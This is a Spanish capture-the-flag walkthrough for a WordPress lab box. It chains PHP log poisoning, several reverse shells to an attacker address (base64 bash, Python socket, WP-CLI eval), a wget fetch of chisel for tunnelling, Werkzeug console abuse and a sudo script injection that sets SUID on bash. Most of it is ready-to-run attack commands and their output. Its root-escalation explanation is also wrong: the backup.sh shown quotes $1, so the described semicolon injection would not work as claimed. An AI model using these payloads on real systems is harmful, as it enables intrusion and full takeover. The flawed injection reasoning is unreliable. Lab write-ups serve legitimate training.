
## 1. Reconocimiento

```bash
sudo nmap -sS -p- --min-rate 5000 172.17.0.2 -oG nmap
nmap -sVC -p22,80 172.17.0.2 -oG vers
```

Puertos abiertos:

| 80     | HTTP     | Apache 2.4.58 — WordPress 6.6.2 |
| ------ | -------- | ------------------------------- |

Se añade el dominio al archivo de hosts para que WordPress resuelva correctamente:

```bash
echo "172.17.0.2 bicho.dl" >> /etc/hosts
```

WordPress redirige peticiones al dominio configurado durante la instalación. Si ese dominio no está en `/etc/hosts`, el navegador no lo resuelve y todas las redirecciones fallan.

---

## 2. Enumeración WordPress — wpscan

```bash
wpscan --url http://bicho.dl -e u
```

Hallazgos:

- Usuario encontrado: `bicho`
- Archivo expuesto: `/wp-content/debug.log`

El archivo `debug.log` es el log de debug de WordPress, activo cuando `WP_DEBUG_LOG` está habilitado en `wp-config.php`. Lo relevante de este archivo no es que exista, sino que WordPress escribe en él contenido que viene de las peticiones — y que es accesible vía web.

---

## 3. Log poisoning — inyección PHP en el User-Agent

El log poisoning es una técnica de inyección indirecta: en lugar de enviar el payload PHP al servidor para que lo ejecute directamente, se hace que el servidor lo **escriba en un archivo de log**, y después se solicita ese archivo. Cuando el servidor PHP interpreta el archivo `.log` como PHP (porque tiene extensión interpretable, o porque se accede desde una URL que pasa por el intérprete), el payload se ejecuta.

En este caso, WordPress escribe en `debug.log` el contenido de ciertas cabeceras HTTP de las peticiones que recibe — en concreto, incluye el `User-Agent` del cliente dentro del mensaje de log cuando un intento de login falla. Si ese User-Agent contiene código PHP, ese código queda almacenado en el log.

**Verificación del vector — phpinfo:**

Se abre Burp Suite y se intercepta una petición POST a `/wp-login.php`. En el Repeater se modifica el header `User-Agent` y se sustituye por el payload de prueba:

```
User-Agent: <?php phpinfo();?>
```

Se envía la petición. WordPress registra el intento de login fallido en `debug.log` incluyendo el User-Agent — que ahora contiene código PHP.

Para ejecutarlo, se visita `http://bicho.dl/wp-content/debug.log` desde el navegador. Apache sirve el archivo `.log` con el módulo PHP activo, lo que hace que el servidor interprete el contenido como PHP en lugar de servirlo como texto plano. La salida completa de `phpinfo()` aparece renderizada en el navegador — confirmación de que el vector funciona.

**Reverse shell vía log poisoning:**

El payload de la shell está codificado en base64 para evitar que caracteres especiales (los `&`, `>`, `/`) rompan la sintaxis PHP dentro del User-Agent o sean interpretados por el servidor antes de llegar al log.

De nuevo desde el Repeater de Burp, se modifica el `User-Agent`:

```
User-Agent: <?php echo `printf c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS80NDQ0IDA+JjE=|base64 -d|bash`;?>
```

El payload base64 decodifica a:

```
sh -i >& /dev/tcp/172.17.0.1/4444 0>&1
```

La construcción funciona así: `printf` imprime la cadena base64 sin salto de línea, `base64 -d` la decodifica al comando de shell real, y `bash` lo ejecuta. Todo esto dentro de las backticks de PHP, que ejecutan el resultado como comando del sistema — que en este caso es la propia shell inversa conectando de vuelta al atacante.

Con el listener activo:

```bash
penelope
# [+] Listening for reverse shells on 0.0.0.0:4444
```

Se visita `http://bicho.dl/wp-content/debug.log` desde el navegador.

Al servir el archivo, PHP interpreta y ejecuta el payload:

```
[+] [New Reverse Shell] => 1460652415d1 172.17.0.2 Linux-x86_64 👤 www-data(33)

www-data@1460652415d1:/$
```

---

## 4. Descubrimiento del servicio interno — puerto 5000

```bash
netstat -tuln
```

```
Proto  Recv-Q  Send-Q  Local Address    Foreign Address  State
tcp    0       0       0.0.0.0:80       0.0.0.0:*        LISTEN
tcp    0       0       0.0.0.0:22       0.0.0.0:*        LISTEN
tcp    0       0       127.0.0.1:5000   0.0.0.0:*        LISTEN
```

El puerto 5000 escucha únicamente en loopback (`127.0.0.1`), lo que significa que no es accesible desde fuera de la máquina. Para interactuar con él desde el atacante hay que crear un túnel que reenvíe ese puerto local al exterior.

---

## 5. Túnel con chisel — exponiendo el puerto 5000

chisel es una herramienta de tunneling TCP sobre HTTP. Funciona en modo cliente/servidor: el servidor escucha en el lado del atacante, y el cliente (ejecutado en la víctima) se conecta al servidor e indica qué puertos redirigir. La clave del modo `--reverse` es que es la víctima quien inicia la conexión hacia el atacante, lo que atraviesa firewalls y filtros de entrada sin necesidad de que el atacante sea alcanzable por la víctima de otra manera.

**Lado del atacante:**

```bash
chisel server -p 8888 --reverse
```

Chisel queda escuchando en el puerto 8888 esperando conexiones de clientes.

**Transferir chisel a la víctima:**

```bash
# Atacante — servir el binario
cp /usr/bin/chisel .
python3 -m http.server 8000
```

```bash
# Víctima (www-data)
cd /tmp
wget http://172.17.0.1:8000/chisel
chmod +x chisel
```

**Lado de la víctima:**

```bash
./chisel client 172.17.0.1:8888 R:9090:127.0.0.1:5000
```

La sintaxis `R:9090:127.0.0.1:5000` significa: crea un reenvío reverso (`R`) de forma que el puerto `9090` del atacante quede conectado al `127.0.0.1:5000` de la víctima. Ahora `http://127.0.0.1:9090` en el atacante es equivalente a `http://127.0.0.1:5000` en la víctima.

---

## 6. Enumeración del servicio interno — Werkzeug /console

```bash
gobuster dir -u http://127.0.0.1:9090 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
/console   (Status: 200)
```

Werkzeug es el servidor WSGI que usa Flask por defecto. Cuando una aplicación Flask se ejecuta en **modo debug** (`debug=True`), Werkzeug expone una consola interactiva de Python en `/console`. Esta consola permite ejecutar código Python arbitrario en el contexto del proceso — es decir, con los permisos del usuario que ejecuta la aplicación Flask.

La consola está protegida por un PIN en versiones modernas de Werkzeug, pero en entornos de laboratorio suele estar sin protección o ya desbloqueada.

Se accede a `http://127.0.0.1:9090/console` en el navegador.

**Prueba inicial:**

```python
import subprocess; subprocess.getoutput('whoami')
```

```
'app'
```

La aplicación Flask corre como el usuario `app`. Se tiene ejecución de código Python arbitrario como ese usuario.

---

## 7. Reverse shell como app

Desde la consola de Werkzeug se lanza una shell inversa completa:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
```

Con el listener en el puerto 2222:

```
app@1460652415d1:~$ whoami
app
```

---

## 8. Escalada a wpuser — WP-CLI fakewp

```bash
sudo -l
```

```
User app may run the following commands on 1460652415d1:
    (wpuser) NOPASSWD: /usr/local/bin/wp
```

`wp` es WP-CLI, la interfaz de línea de comandos para WordPress. Entre sus funciones está `wp eval`, que ejecuta PHP arbitrario en el contexto de una instalación de WordPress. El problema es que WP-CLI necesita una instalación de WordPress válida con `wp-config.php` para funcionar — si no la encuentra, falla.

La técnica "fakewp" consiste en crear una instalación de WordPress mínima en un directorio temporal que WP-CLI acepte como válida, apuntando a la base de datos real de la instalación existente.

**Esta parte requiere dos terminales simultáneas** — una como `app` y otra como `www-data` — porque `wp core download` crea el `wp-config-sample.php` con los permisos de `wpuser`, y para escribir la configuración real en ese archivo hay que hacerlo desde `www-data` (que tiene acceso al `wp-config.php` real).

**Terminal 1 (app):**

```bash
mkdir /tmp/fakewp && chmod 777 /tmp/fakewp
sudo -u wpuser /usr/local/bin/wp core download --path=/tmp/fakewp
cp /tmp/fakewp/wp-config-sample.php /tmp/fakewp/wp-config.php
chmod 777 /tmp/fakewp/wp-config.php
```

`wp core download` descarga los archivos de WordPress en `/tmp/fakewp`. Luego se copia el archivo de configuración de ejemplo como base. El `chmod 777` es necesario para que `www-data` pueda sobreescribirlo en el siguiente paso.

**Terminal 2 (www-data):**

```bash
cat /var/www/bicho.dl/wp-config.php > /tmp/fakewp/wp-config.php
```

Se copia la configuración real (con credenciales de base de datos reales) al `wp-config.php` de la instalación falsa. Ahora WP-CLI puede conectarse a la base de datos real usando la instalación temporal como punto de entrada.

**Terminal 1 (app) — ejecutar PHP como wpuser:**

```bash
sudo -u wpuser /usr/local/bin/wp --path=/tmp/fakewp eval 'system("bash -c \"bash -i >& /dev/tcp/172.17.0.1/6666 0>&1\"");'
```

`wp eval` ejecuta el PHP que se le pase en el contexto de WordPress — pero lo que importa aquí es que corre como `wpuser` gracias al `sudo`. La función `system()` lanza el comando directamente en la shell del proceso.

Con el listener en el puerto 6666:

```
wpuser@1460652415d1:/tmp/fakewp$ whoami
wpuser
```

---

## 9. Escalada a root — inyección en backup.sh

```bash
sudo -l
```

```
User wpuser may run the following commands on 1460652415d1:
    (root) NOPASSWD: /opt/scripts/backup.sh
```

```bash
cat /opt/scripts/backup.sh
```

El script acepta argumentos del usuario y los incorpora directamente en un comando, sin ningún tipo de sanitización:

```bash
#!/bin/bash
echo "Realizando backup de: $1"
tar -czf /tmp/backup.tar.gz "$1"
echo "Backup completado."
```

La variable `$1` se inserta literalmente en el comando. En bash, el punto y coma (`;`) separa comandos — si `$1` contiene un `;`, el intérprete termina el comando actual y ejecuta lo que sigue como un nuevo comando independiente.

```bash
sudo /opt/scripts/backup.sh "root; chmod u+s /bin/bash | echo 'Ahora eres root'"
```

El argumento que recibe el script es `root; chmod u+s /bin/bash | echo 'Ahora eres root'`. Cuando bash expande `$1`, el punto y coma rompe la línea en dos comandos:

1. `tar -czf /tmp/backup.tar.gz root` — intenta hacer backup de un directorio llamado "root" (falla, pero no importa)
2. `chmod u+s /bin/bash` — establece el bit SUID en bash, ejecutado como root porque el script corre con sudo

```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash
```

El bit SUID está activo. Ahora cualquier usuario puede ejecutar bash con los privilegios del propietario del binario (root):

```bash
bash -p
```

La flag `-p` es necesaria porque bash moderno, por seguridad, descarta el UID efectivo en modo interactivo salvo que se le indique explícitamente que lo mantenga con esa opción.

```bash
bash-5.2# id
uid=1001(wpuser) gid=1001(wpuser) euid=0(root) groups=1001(wpuser)
bash-5.2# whoami
root
```

**Flags:**

```bash
cat /home/bicho/user.txt
# ab1555f24bc7065bcdd1a119f09898c7

cat /root/root.txt
# 58a42609370d35a203f541d8d41801a8
```
